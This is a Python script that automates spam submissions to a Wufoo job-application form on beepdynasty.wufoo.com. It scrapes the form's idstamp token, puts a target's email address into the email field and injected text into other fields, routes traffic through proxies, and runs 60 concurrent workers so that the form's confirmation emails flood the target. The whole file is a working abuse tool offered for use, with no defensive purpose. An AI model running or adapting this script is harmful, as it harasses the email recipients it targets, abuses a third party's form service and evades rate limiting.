import re
from os.path import basename

import requests

from module import Spam


def get(session: requests.Session):
    headers = {
        'authority': 'beepdynasty.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    response = session.get(
        'https://beepdynasty.wufoo.com/forms/z8a3u4v1417f63',
        headers=headers
    )
    return response


def post(session: requests.Session, id_stamp, text, target):
    headers = {
        'authority': 'beepdynasty.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'origin': 'https://beepdynasty.wufoo.com/',
        'referer': 'https://beepdynasty.wufoo.com/forms/z8a3u4v1417f63',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryD8JBOZUtsbNHX9Ik',
    }

    data = '------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field9"\r\n\r\ntest\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field10"\r\n\r\ntest\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field8"\r\n\r\n123\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field8-1"\r\n\r\n123\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field8-2"\r\n\r\n1123\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field7"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field646"\r\n\r\nYes\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field648"\r\n\r\nYes\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field651"\r\n\r\nEast Gwillimbury\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field653"\r\n\r\ntest\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field658"\r\n\r\nBC\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field655"\r\n\r\nNo\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field4"\r\n\r\n3\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field438"\r\n\r\n2\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field217"\r\n\r\n2\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field440"\r\n\r\n12\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field544"\r\n\r\nNo\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field326"\r\n\r\ntest\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field11"; filename="test"\r\nContent-Type: application/octet-stream\r\n\r\ntest\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field324"\r\n\r\nFacebook Ad\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field660"\r\n\r\nWindshield Repair Technician\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="Field219"\r\n\r\nhttps://beepdynasty.wufoo.com/forms/z8a3u4v1417f63\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="currentPage"\r\n\r\nasOp7BaPqlZTly3oA8s5GaWrdEJXDYqawuBemmKqDpwuslashTq0=\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="saveForm"\r\n\r\nApply\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="comment"\r\n\r\n\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="idstamp"\r\n\r\nidstamp_field\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="encryptedPassword"\r\n\r\n\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="stats"\r\n\r\n{"errors":1,"startTime":723,"endTime":103804,"referer":"https://beepdynasty.wufoo.com/forms/z8a3u4v1417f63"}\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik\r\nContent-Disposition: form-data; name="clickOrEnter"\r\n\r\nclick\r\n------WebKitFormBoundaryD8JBOZUtsbNHX9Ik--\r\n'

    data = data.replace('idstamp_field', id_stamp).replace('test', text).replace('wezxasqw@gmail.com', target)

    response = session.post(
        'https://beepdynasty.wufoo.com/forms/z8a3u4v1417f63',
        headers=headers,
        data=data.encode(),
    )
    return response


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        s.proxies = self.get_proxies()
        get_resp = get(s)
        pattern = re.compile('(?<=name="idstamp" value=").*(?=" >)')
        idstamp = pattern.findall(get_resp.text)
        if not idstamp:
            return
        text = self.get_text()
        post_resp = post(s, idstamp[0], text, target)
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'thank')
    res = spam.send_post()
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
